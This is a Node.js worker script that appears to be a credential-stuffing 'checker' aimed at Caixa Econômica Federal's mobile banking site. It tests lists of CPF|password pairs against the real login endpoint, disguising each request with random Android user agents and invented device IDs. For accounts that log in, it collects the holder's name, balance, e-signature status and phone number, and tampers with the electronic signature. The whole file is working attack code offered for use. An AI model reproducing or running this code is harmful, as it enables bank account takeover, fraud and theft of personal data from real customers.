const axios = require('axios').default
const axiosCookieJarSupport = require('axios-cookiejar-support').default;
const tough = require('tough-cookie');
const randomUseragent = require('random-useragent');
const md5 = require("./md5decode").md5
const checkInternetConnected = require('check-internet-connected');
const { post } = require('request');
// const { loadImage } = require('terminal-kit/ScreenBufferHD');

function formatarCPFExibicaoApenas(v) {
    if (v != undefined) {
        if (v.length <= 14) {
            v = v.replace(/(\d{3})(\d)/, "$1.$2")
            v = v.replace(/(\d{3})(\d)/, "$1.$2")
            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2")
            return v;
        }
    }
}


function isValidCPF(cpf) {
    if (typeof cpf !== "string") return false
    cpf = cpf.replace(/[\s.-]*/igm, '')
    if (
        !cpf ||
        cpf.length != 11 ||
        cpf == "00000000000" ||
        cpf == "11111111111" ||
        cpf == "22222222222" ||
        cpf == "33333333333" ||
        cpf == "44444444444" ||
        cpf == "55555555555" ||
        cpf == "66666666666" ||
        cpf == "77777777777" ||
        cpf == "88888888888" ||
        cpf == "99999999999"
    ) {
        return false
    }
    var soma = 0
    var resto
    for (var i = 1; i <= 9; i++)
        soma = soma + parseInt(cpf.substring(i - 1, i)) * (11 - i)
    resto = (soma * 10) % 11
    if ((resto == 10) || (resto == 11)) resto = 0
    if (resto != parseInt(cpf.substring(9, 10))) return false
    soma = 0
    for (var i = 1; i <= 10; i++)
        soma = soma + parseInt(cpf.substring(i - 1, i)) * (12 - i)
    resto = (soma * 10) % 11
    if ((resto == 10) || (resto == 11)) resto = 0
    if (resto != parseInt(cpf.substring(10, 11))) return false
    return true
}


var output = "";

var processando = [];

setInterval(() => {

    process.send({ processando: processando, listasConcluidas: listasConcluidas })

}, 1000);

process.send.prototype = function (args) {

    processando = processando.filter((value) => {
        return args.includes(value) === false
    })

    if (output.includes(args) === false) {
        output += `${args}\r\n`
        // console.log(args);
        return process.send(args)
    } else {
        return process.send(args)
    }
}

function enviaRepetida(line) {
    var envia = output.split("\r\n").filter((value) => {
        return value.includes(line)
    })[0]

    process.send(envia)
}

function getRandomNumberBetween(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}



async function caixa(line, retry = false) {

    var a = getRandomNumberBetween

    if (line.includes("APROVADO")) {

        line = `${line.substr(11, 20)}|${line.substr(line.indexOf("DISPOSITIVO") + 13, 16)}`

        console.log(line);


        var digest = `${a(1, 9)}D${a(1, 9)}${a(1, 9)}${a(1, 9)}DC${a(1, 9)}|${a(1, 9)}C${a(1, 9)}${a(1, 9)}D${a(1, 9)}E${a(1, 9)}`

        console.log(digest);

        if (line.split("|")[1].length == 6) {
        }

        try {
            if (line.split("|").length > 2) {
                digest = line.split("|")[2].substr(0, 8) + "|" + line.split("|")[2].substr(8, 8)
            }
        } catch (error) {

        }

    } else if (line.includes("|")) {
        var digest = `${a(1, 9)}D${a(1, 9)}${a(1, 9)}${a(1, 9)}DC${a(1, 9)}|${a(1, 9)}C${a(1, 9)}${a(1, 9)}D${a(1, 9)}E${a(1, 9)}`
        if (line.split("|")[1].length == 6) {
        }

        try {
            if (line.split("|").length > 2) {
                digest = line.split("|")[2].substr(0, 8) + "|" + line.split("|")[2].substr(8, 8)
            }
        } catch (error) {

        }
    }


    const jar = new tough.CookieJar();
    var instance = axios.create({
        jar: jar,
        withCredentials: true,
        timeout: 30000
    })
    axiosCookieJarSupport(instance);


    instance.interceptors.response.use(async res => {

        if (res !== undefined) {

            const url = res.config.url;
            if (url.includes("adesaoBiometria")) {

                try {

                    return { resultado: "APROVADO", nome: res.data.cliente, refreshToken: res.data.refresh_token, digestIdDispositivo: res.data.id, saldo: 0, assinatura: "INDEFINIDA", telefone: "null", trocaAssinatura: "IMPOSSIVEL ALTERAR" }

                } catch (error) {
                    console.log(error);

                    await sleep(100);
                    return await caixa(line)
                }
            }

            if (url.includes("componentSaldo")) {
                try {
                    return res.data.saldo
                } catch (error) {
                    console.log(error);

                    await sleep(100);
                    return await _saldo()
                }
            }

            if (url.includes("recuperaSituacaoAssinatura")) {
                try {
                    if (typeof res.data == "object") {
                        const retornoAssinatura = res.data[0]
                        if (retornoAssinatura.includes("alterar a sua Assinatura Eletrônica")) {
                            return "PRECISA ALTERAR"
                        } else if (retornoAssinatura.includes("eletrônica se encontra bloqueada")) {
                            return "BLOQUEADA"
                        } else if (retornoAssinatura.includes("esta CANCELADA")) {
                            return "CANCELADA"
                        } else if (retornoAssinatura.includes("esta ATIVA")) {
                            return "ATIVA"
                        } else {
                            return "indefinida"
                        }
                    } else {
                        await sleep(100);
                        return await _assinatura()
                    }
                } catch (error) {
                    await sleep(100);
                    return await _assinatura()
                }
            }

            if (url.includes("alteraAssinatura/validarAssinaturaConta")) {
                // console.log(res.data);

                try {
                    if (typeof res.data == "object") {
                        const mensagemErro = res.data.mensagemPaginaErro;
                        return `${mensagemErro}`
                    } else {
                        if (res.data.includes("efetuada com sucesso")) {
                            console.log("assinatura cantou");

                            return "cantou"
                        } else {
                            return "IMPOSSIVEL ALTERAR"
                        }
                    }
                } catch (error) {

                    if (res.data.length === 0) {
                        return "null"
                    } else {

                        await sleep(100);
                        return await _trocaAssinatura()
                    }
                }
            }



            if (url.includes("cadDispositivo/listadeCelulares")) {


                try {

                    if (res.data.length === 0) {
                        return "SEM TELEFONE"
                    } else {
                        if (res.data[0] !== undefined) {

                            var celu = await md5(`${res.data[0].numeroCelular}`.substr(0, 3), `${res.data[0].hashNumCelular}`)

                            return `(${res.data[0].dddCelular}) ${celu}`

                        } else {
                            
                            return "TELEFONE NAO PUXOU"
                        }
                    }
                } catch (error) {
                    if (res.data.length === 0) {
                        return "SEM TELEFONE"
                    } else {

                        await sleep(100);
                        return await _telefone()
                    }
                }
            }

            return res



        } else {
            return await caixa(line)
        }




    }, async err => {

        const response = err.response;
        if (response !== undefined) {
            const url = err.response.config.url;
            const status = err.response.status;
            if (url.includes("adesaoBiometria")) {
                if (status == 401) {
                    return { resultado: "REPROVADO", erro: err.response.data.motivo }
                } else {
                    await sleep(100);
                    return await _login()
                }
            } else if (url.includes("componentSaldo")) {
                // console.log(response);

                await sleep(100)
                return await _saldo()

            } else if (url.includes("recuperaSituacaoAssinatura")) {
                await sleep(100)
                return await _assinatura()

            } else if (url.includes("cadDispositivo/listadeCelulares")) {
                await sleep(100)
                return await _telefone()

            } else if (url.includes("alteraAssinatura/validarAssinaturaConta")) {

                // console.log(err);

                await sleep(100)
                return await _trocaAssinatura()

            } else {
                console.log("erro");
                return err
            }
        } else {
            return err
        }


    })

    var SOversao = ""

    var userAgent = randomUseragent.getRandom(function (ua) {

        if (parseInt(ua.osVersion) >= 5 && ua.osName == "Android") {
            SOversao = ua.osVersion
            return ua.osName == "Android" && parseInt(ua.osVersion) >= 5
        }

    })



    async function _login() {

        var a = getRandomNumberBetween
        return await instance.request({
            url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/adesaoBiometria?nocache=" + new Date().getTime(),
            headers: {
                "Host": "mob.internetbanking.caixa.gov.br",
                "Connection": "close",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": userAgent,
                "Origin": "https://mob.internetbanking.caixa.gov.br",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "content-type": "application/x-www-form-urlencoded",
                "Accept-Language": "en-US,en;q=0.9",
                "X-Requested-With": "br.com.gabba.Caixa",
            },
            method: "POST",
            data: `usuario=${line.split("|")[0]}&senha=${line.split("|")[1]}&segmento=1&scope=offline_access&TL=&digestIdDispositivo=${digest}&LA=&PL=&ODF=&EM=0&SOVersao=${SOversao}&SO=11&RO=1&AppVersao=3.8.2&LO=0.0`
        })

    }

    async function _saldo() {
        var a = getRandomNumberBetween
        return await instance.request({
            url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/componentSaldo/atualizaSaldo?nocache=" + new Date().getTime(),
            method: "GET",
            headers: {
                "User-Agent": userAgent,
                "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                "X-Requested-With": "XMLHttpRequest"
            }
        })
    }

    async function _assinatura() {
        var a = getRandomNumberBetween
        return await instance.request({
            url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/cadDispositivo/recuperaSituacaoAssinatura?_=" + new Date().getTime(),
            method: "GET",
            headers: {
                "User-Agent": userAgent,
                "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                "X-Requested-With": "XMLHttpRequest"
            }
        })
    }
    async function _telefone() {
        return await instance.request({
            url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/cadDispositivo/listadeCelulares?_=" + new Date().getTime(),
            method: "GET",
            headers: {
                "Host": "mob.internetbanking.caixa.gov.br",
                "Connection": "close",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": userAgent,
                "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
        })
    }

    async function _trocaAssinatura() {
        if (line.split("|")[1].length === 8) {
            var txtassinatura = `${line.split("|")[1].substr(0, 4)}${line.split("|")[1].substr(6, 8)}`
            // console.log(txtassinatura);

            var step1 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                method: "GET",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            })

            step1 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/carrossel/carregar?nocache=1609375841333",
                method: "GET",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            })


            await sleep(100)

            // console.log(step1);

            // return


            var step2 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc-gerenciamento/nb/contas/listarContas?nocache=" + new Date().getTime(),
                method: "GET",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            })

            var chave = step2.data[0].chave

            step2 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc/nb/carrossel/carregar?_=" + new Date().getTime(),
                method: "GET",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            })
            step2 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc-gerenciamento/nb/assinatura/alterarOuCadastrar?chave=" + chave + "&opcao=alterar&nocache=" + new Date().getTime(),
                method: "GET",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            })
            step2 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc-gerenciamento/nb/selecionaConta?nocache=" + new Date().getTime(),
                method: "POST",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                },
                data: `chaveConta=${chave}&userAgent=Mozilla%2F5.0+(Linux%3B+Android+7.1.1%3B+Google+Build%2FNMF26Q%3B+wv)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Version%2F4.0+Chrome%2F74.0.3729.186+Mobile+Safari%2F537.36&versaoPlugin=&retornoF10=`
            })
            step2 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc-gerenciamento/nb/verificaConta?nocache=" + new Date().getTime() + "&rangeMinimo=0&rangeMaximo=0&saldoVisible=true",
                method: "GET",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
            })

            step2 = await instance.request({
                url: "https://mob.internetbanking.caixa.gov.br/sinbc-gerenciamento/nb/alteraAssinatura/validarAssinaturaConta?nocache=" + new Date().getTime(),
                method: "POST",
                headers: {
                    "Host": "mob.internetbanking.caixa.gov.br",
                    "Connection": "close",
                    "Accept": "text/html, */*; q=0.01",
                    "Origin": "https://mob.internetbanking.caixa.gov.br",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": userAgent,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Referer": "https://mob.internetbanking.caixa.gov.br/sinbc/nb/home",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                },
                data: `assinAtual=${txtassinatura}&novaAssin=${txtassinatura}&confirmaNovaAssin=${txtassinatura}`
            })

            if (step2 == "cantou") {

                return `OK [${txtassinatura}]`

            } else {

                return `ERRO [${txtassinatura}]`
            }



        } else {
            // console.log(line.split("|")[1]);

            return await _trocaAssinatura()
        }


    }

    if (output.includes(line)) {
        enviaRepetida(line)
        return { resultado: "REPETIDA" }
    }


    processando.push(line)


    try {

        var data = await _login()


        if (data.resultado == "APROVADO") {

            try {

                var saldo = await _saldo()
                data.saldo = saldo

                var assinatura = await _assinatura()

                data.assinatura = assinatura

                if (assinatura == "ATIVA") {

                    var telefone = await _telefone()
                    data.telefone = telefone


                    var trocaAssinatura = await _trocaAssinatura()
                    data.trocaAssinatura = trocaAssinatura

                }



                // console.log(data)



            } catch (error) {
                console.log(error);
            }
        }



        return data
    } catch (error) {
        console.log(error);
    }


}

function split(array, cols) {
    var ret = [];
    if (cols == 1 || array.length === 1) {
        ret.push(array);
    } else {
        var size = Math.ceil(array.length / cols);
        for (var i = 0; i < cols; i++) {
            var start = i * size;
            ret.push(array.slice(start, start + size));
        }
    }
    return ret;
}

var listasConcluidas = 0

var sleep = (ms) => {
    return new Promise((resolve, rejects) => {
        setTimeout(() => {
            resolve()
        }, ms);
    })
}

process.on("message", (message) => {


    var mensagem = message.message
    var trabalhadores = message.trabalhadores
    // console.log(trabalhadores);

    var limit = mensagem.length - 1

    if (trabalhadores < limit) {

        var myantarr = split(mensagem, trabalhadores)
        // console.log(myantarr);
        var myarr = myantarr.entries()
    } else {
        var myantarr = split(mensagem, limit)
        console.log(myantarr);
        var myarr = myantarr.entries()
    }



    var myrun = async function () {
        var next = myarr.next()

        if (next.done === false) {
            var lista = next.value[1]


            for (const myiterator of lista) {

                var iterator = myiterator

                try {

                    if (iterator.includes("APROVADO")) {
                        // iterator = `${iterator.substr(11, 20)}|${iterator.substr(iterator.indexOf("DISPOSITIVO") + 13, 16)}`
                        // console.log(iterator);

                        var resultado = await caixa(iterator);

                        try {
                            if (resultado.resultado == "APROVADO") {
                                process.send.prototype(`APROVADO > ${iterator} | SENHA BATENDO: SIM | NOME: ${resultado.nome} | DISPOSITIVO: ${resultado.digestIdDispositivo} | SALDO: ${resultado.saldo} | ASSINATURA: ${resultado.assinatura} | TELEFONE: ${resultado.telefone} | NUMERO ASSINATURA: ${resultado.trocaAssinatura} CAIXA | THEQUEEN`);
                            }
                            else {
                                process.send.prototype(`REPROVADO > ${iterator} | CAIXA`);
                            }
                        } catch (ex) {
                            console.log(ex);

                        }
                    } else {
                        if (iterator.includes("|")) {
                            if (iterator.split("|")[1].length === 6) {
                                iterator = iterator.split("|")[0] + "|" + iterator.split("|")[1].substr(0, 4) + "19" + iterator.split("|")[1].substr(4, 6)
                                var resultado = await caixa(iterator);

                                try {
                                    if (resultado.resultado == "APROVADO") {
                                        process.send.prototype(`APROVADO > ${iterator} | SENHA BATENDO: SIM | NOME: ${resultado.nome} | DISPOSITIVO: ${resultado.digestIdDispositivo} | SALDO: ${resultado.saldo} | ASSINATURA: ${resultado.assinatura} | TELEFONE: ${resultado.telefone} | NUMERO ASSINATURA: ${resultado.trocaAssinatura} CAIXA | THEQUEEN`);
                                    }
                                    else {
                                        process.send.prototype(`REPROVADO > ${iterator} | CAIXA`);
                                    }
                                } catch (ex) {
                                    console.log(ex);

                                }

                            } else if (iterator.split("|")[1].length === 8) {
                                var resultado = await caixa(iterator);

                                if (resultado.resultado == "APROVADO") {
                                    process.send.prototype(`APROVADO > ${iterator} | SENHA BATENDO: SIM | NOME: ${resultado.nome} | DISPOSITIVO: ${resultado.digestIdDispositivo} | SALDO: ${resultado.saldo} | ASSINATURA: ${resultado.assinatura} | TELEFONE: ${resultado.telefone} | TROCA ASSINATURA: ${resultado.trocaAssinatura} CAIXA | THEQUEEN`);
                                }
                                else {
                                    process.send.prototype(`REPROVADO > ${iterator} | CAIXA`);
                                }
                            } else {
                                process.send.prototype(`REPROVADO > ${iterator} INVALIDA | CAIXA`)
                            }

                        } else {
                            process.send.prototype(`REPROVADO > ${iterator} INVALIDA | CAIXA`)
                        }
                    }



                } catch (error) {
                    console.log(error);

                }

            }

        } else {
            listasConcluidas += 1
        }




    }

    myantarr.some(() => {
        myrun()
        // await sleep(300)
    })
})



// module.exports.checar = checar